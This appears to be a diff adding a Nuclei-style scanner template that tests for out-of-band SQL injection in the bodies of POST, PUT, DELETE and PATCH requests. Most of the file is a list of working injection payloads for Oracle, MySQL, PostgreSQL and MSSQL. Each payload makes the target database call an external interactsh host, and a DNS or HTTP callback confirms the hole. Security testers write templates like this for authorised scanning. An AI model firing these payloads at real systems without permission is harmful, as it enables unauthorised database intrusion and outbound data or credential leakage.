@@ -1,0 +1,45 @@
+id: dbs-body-collaborator
+
+info:
+  name: Out-Of-Band SQL Injection
+  author: reewardius
+  severity: high
+  reference:
+    - https://www.tarlogic.com/blog/red-team-tales-0x01/
+    - https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
+    - https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body,fuzzing-req-body-query,oob,dast,fuzzing-req-oob
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'
+          - 'method == "PUT"'
+          - 'method == "DELETE"'
+          - 'method == "PATCH"'
+        
+    payloads:
+      rce:
+        - "'||;COPY users(names) FROM '\\{{interactsh-url}}\';||'"
+        - "'||(SELECT LOAD_FILE('\\{{interactsh-url}}'))||'"
+        - "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}'))||'"
+        - "'||(SELECT UTL_HTTP.REQUEST('http://{{interactsh-url}}') FROM DUAL)||'"
+        - "'||(SELECT HTTPURITYPE('http://{{interactsh-url}}').GETCLOB() FROM DUAL)||'"
+        - "'||(SELECT DBMS_LDAP.INIT(('{{interactsh-url}}',80) FROM DUAL)||'"
+        - "974'+(select('\\\\{{interactsh-url}}\\wqrwr'))+'"
+        
+    fuzzing:
+      - part: body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
